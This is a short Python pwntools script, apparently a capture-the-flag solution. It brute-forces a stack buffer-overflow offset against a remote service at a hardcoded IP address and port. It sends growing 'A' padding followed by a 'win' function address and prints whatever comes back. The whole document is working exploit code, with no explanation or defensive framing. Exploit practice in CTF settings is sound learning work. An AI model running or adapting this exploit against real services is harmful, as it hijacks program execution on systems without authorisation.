from pwn import *
win=0x40060d
for i in range(0x100):
	print i
	p=remote('111.200.241.244',53695)
	pay = "A"*(8*i)+p64(win)
	p.sendlineafter('>',pay)
	try:
		print p.recv()
	except:
		p.close()
